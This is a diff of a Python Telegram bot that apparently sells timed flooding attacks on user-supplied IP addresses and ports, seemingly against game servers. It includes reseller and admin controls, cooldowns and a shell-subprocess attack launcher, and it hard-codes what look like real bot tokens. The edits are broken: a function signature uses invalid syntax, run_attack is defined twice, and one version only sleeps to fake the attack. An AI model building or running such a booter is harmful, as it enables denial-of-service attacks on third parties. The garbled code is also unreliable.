@@ -17,7 +17,7 @@ import subprocess
 
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7775840737:AAFmUfq_O-IctYTJ13ErkiJ-_8XQqiGL-dA')
+bot = telebot.TeleBot('7633435652:AAFT6uodtFKq1xi3EGfFYjGpgecGc66MgAE')
 
 # Admin user IDs
 admin_id = {"6768273586", "2007860433"}
@@ -130,7 +130,7 @@ def save_resellers(resellers):
 resellers = load_resellers()
 
 
-async def run_attack(chat_id, ip, port, time):
+async def run_attack(message.chat.id, ip, port, time):
     try:
         # Execute the attack command using a subprocess
         process = await asyncio.create_subprocess_shell(
@@ -329,9 +329,10 @@ def start_command(message):
         f"*➖𝗣𝗹𝗲𝗮𝘀𝗲 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗼𝗽𝘁𝗶𝗼𝗻 𝗳𝗿𝗼𝗺 𝗯𝗲𝗹𝗼𝘄 👀* ",
         parse_mode='Markdown'
     )
-COOLDOWN_PERIOD = 120  # 1 minutes
 
-# Handle the "🚀 Attack" button press
+COOLDOWN_PERIOD = 120  # 
+
+# Handle the 🚀 Attack button
 @bot.message_handler(func=lambda message: message.text == "🚀 Attack")
 def handle_attack(message):
     user_id = str(message.chat.id)
@@ -351,13 +352,13 @@ def handle_attack(message):
             time_since_last_attack = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
             if time_since_last_attack < COOLDOWN_PERIOD:
                 remaining_cooldown = COOLDOWN_PERIOD - time_since_last_attack
-                response = f"⌛️ *𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗶𝗻 𝗲𝗳𝗳𝗲𝗰𝘁 𝘄𝗮𝗶𝘁 {int(remaining_cooldown)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀*"
-                bot.reply_to(message, response)
+                response = f"⌛️ *𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗶𝗻 𝗲𝗳𝗳𝗲𝗰𝘁. 𝗪𝗮𝗶𝘁 {int(remaining_cooldown)} 𝘀econds.*"
+                bot.reply_to(message, response, parse_mode='Markdown')
                 return
 
         # Prompt the user for attack details
-        response = "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝗽, 𝗽𝗼𝗿𝘁 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲"
-        bot.reply_to(message, response)
+        response = "🚀 *Enter the target IP, port, and duration (in seconds) separated by spaces.*"
+        bot.reply_to(message, response, parse_mode='Markdown')
         bot.register_next_step_handler(message, process_attack_details)
     else:
         response = (
@@ -380,54 +381,51 @@ def process_attack_details(message):
             if port in blocked_ports:
                 bot.send_message(
                     message.chat.id,
-                    f"‼️ 𝙋𝙤𝙧𝙩 {port} 𝙞𝙨 𝙗𝙡𝙤𝙘𝙠𝙚𝙙 ‼️ , 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙖 𝙙𝙞𝙛𝙛𝙚𝙧𝙚𝙣𝙩 𝙥𝙤𝙧𝙩 "
+                    f"‼ *Port {port} is blocked.* Please use a different port.",
+                    parse_mode='Markdown'
                 )
                 return
 
             # Check if the time exceeds the limit
             if time > 240:  # Limit time to 240 seconds
-                response = "❗️𝗘𝗿𝗿𝗼𝗿 : 𝗨𝗦𝗘 𝗟𝗘𝗦𝗦 𝗧𝗛𝗔𝗡 𝟮𝟰𝟬 𝗦𝗘𝗖𝗢𝗡𝗗𝗦❗️"
-                bot.reply_to(message, response)
+                response = "❗️*Error: Use less than 240 seconds.*❗️"
+                bot.reply_to(message, response, parse_mode='Markdown')
                 return
 
-            # Record and log the attack (optional logging functionality)
-            record_command_logs(user_id, 'attack', target, port, time)
-
-            # Notify the user that the attack is being executed
+            # Notify the user that the attack is being executed (original format preserved)
             username = message.chat.username or "No username"
             response = (
-                f"🚀 *𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 !* 🚀"
+                f"🚀 *Attack Sent Successfully!* 🚀\n\n"
+                f"*‼ 𝗛𝗲𝗹𝗹𝗼 @{username},  𝗬𝗼𝘂𝗿 𝗔𝘁𝘁𝗮𝗰𝗸 𝗼𝗻  {target} : {port} 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗶𝗻 {time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 . \n\n𝗣𝗲𝗮𝗰𝗲𝗳𝘂𝗹𝗹𝘆 𝘄𝗮𝗶𝘁 𝗶𝗻 𝗣𝗟𝗔𝗡𝗘  / 𝗟𝗢𝗕𝗕𝗬 𝘄𝗶𝘁𝗵𝗼𝘂𝘁 𝘁𝗼𝘂𝗰𝗵𝗶𝗻𝗴 𝗮𝗻𝘆 𝗕𝘂𝘁𝘁𝗼𝗻 ‼*"
             )
             bot.reply_to(message, response, parse_mode='Markdown')
-            
-            # Send a follow-up message
-            username = message.chat.username or "No username"  # Define username outside the function call
-            bot.send_message(
-            message.chat.id,
-            f"*‼️ 𝗛𝗲𝗹𝗹𝗼 @{username},  𝗬𝗼𝘂𝗿 𝗔𝘁𝘁𝗮𝗰𝗸 𝗼𝗻  {target} : {port} 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗶𝗻 {time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 . \n\n𝗣𝗲𝗮𝗰𝗲𝗳𝘂𝗹𝗹𝘆 𝘄𝗮𝗶𝘁 𝗶𝗻 𝗣𝗟𝗔𝗡𝗘  / 𝗟𝗢𝗕𝗕𝗬 𝘄𝗶𝘁𝗵𝗼𝘂𝘁 𝘁𝗼𝘂𝗰𝗵𝗶𝗻𝗴 𝗮𝗻𝘆 𝗕𝘂𝘁𝘁𝗼𝗻 ‼️*",
-            parse_mode='Markdown'
-            )
 
+            # Run the attack asynchronously and notify when finished
             asyncio.run(run_attack(message.chat.id, target, port, time))
-
-            # After attack time finishes, notify user (optional
-            threading.Timer(time, send_attack_finished_message, [message.chat.id]).start()
 
             # Update the last attack time for cooldown tracking
             last_attack_time[user_id] = datetime.datetime.now()
 
         except ValueError:
-            response = "*Invalid port or time format.*"
+            response = "*Invalid port or duration format.* Please enter valid numbers."
             bot.reply_to(message, response, parse_mode='Markdown')
     else:
         response = "*Invalid format.* Please provide IP, port, and duration separated by spaces."
         bot.reply_to(message, response, parse_mode='Markdown')
 
-def send_attack_finished_message(chat_id):
+# Simulate running an attack (asynchronous)
+async def run_attack(chat_id, target, port, time):
+    await asyncio.sleep(time)  # Simulate attack duration
+    await send_attack_finished_message(chat_id)
+
+# Send a message when the attack finishes (original format preserved)
+async def send_attack_finished_message(chat_id):
     message = (
-        "*𝗬𝗼𝘂𝗿 𝗮𝘁𝘁𝗮𝗰𝗸 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱. 𝗬𝗼𝘂 𝗰𝗮𝗻 𝗰𝗼𝗻𝘁𝗶𝗻𝘂𝗲 𝗽𝗹𝗮𝘆𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗺𝗮𝘁𝗰𝗵* 👀\n\n*𝗜𝗙 𝗬𝗼𝘂 𝗙𝗮𝗰𝗲 𝗮𝗻𝘆 𝗶𝘀𝘀𝘂𝗲 𝗶𝗻 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁 𝗸𝗶𝗻𝗱𝗹𝘆 𝗿𝗲𝗽𝗼𝗿𝘁 𝗶𝘁 𝘁𝗼*\n\n             [➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 ➖](https://t.me/MrinMoYxCB)"
+        "*✅ Your attack has been completed successfully!*\n\n"
+        "*If you face any issues with this bot, kindly report it to*\n\n"
+        "[➖ CLICK HERE ➖](https://t.me/MrinMoYxCB)"
     )
-    bot.send_message(chat_id, message, parse_mode='Markdown', disable_web_page_preview=True)
+    await bot.send_message(chat_id, message, parse_mode='Markdown', disable_web_page_preview=True)
 
 
 
